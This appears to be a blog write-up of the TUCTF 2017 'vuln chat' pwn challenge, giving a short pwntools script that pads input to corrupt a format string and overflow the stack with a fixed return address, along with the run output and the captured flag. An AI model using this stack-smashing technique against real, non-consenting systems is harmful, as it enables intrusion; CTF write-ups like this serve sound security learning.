---
title: "TUCTF 2017 - vuln chat (Pwn)"
header:
  overlay_image: /assets/images/tuctf2017/vulnchat/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Life is Strange Stills by Me"
tags:
  - tuctf2017
  - writeup
  - pwn
---

Pwnable.

## Challenge Description

#### Points

50

#### Description

```
One of our informants goes by the handle djinn. He found some information while
working undercover inside an organized crime ring. Although we've had trouble
retrieving this information from him. He left us this chat client to talk with
him. Let's see if he trusts you...

nc vulnchat.tuctf.com 4141
```

## Solution

```python
from pwn import *

def main():
    p = process("./vuln-chat")
    p = connect("vulnchat.tuctf.com", 4141)

    p.sendline("A"*20 + "%s")

    p.sendline("A"*49 + p32(0x804856b))

    p.interactive()

if __name__ == '__main__':
    main()
```

```
ubuntu@ubuntu-xenial:/vagrant/tuctf/vulnchat$ python exploit.py
[+] Opening connection to vulnchat.tuctf.com on port 4141: Done
[*] Switching to interactive mode
----------- Welcome to vuln-chat -------------
Enter your username: Welcome AAAAAAAAAAAAAAAAAAAA%s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
AAAAAAAAAAAAAAAAAAAA%s: djinn: Sorry. That's not good enough
TUCTF{574ck_5m45h1n6_l1k3_4_pr0}
Use it wisely
[*] Got EOF while reading in interactive
$
```

**Flag: TUCTF{574ck\_5m45h1n6\_l1k3\_4\_pr0}**
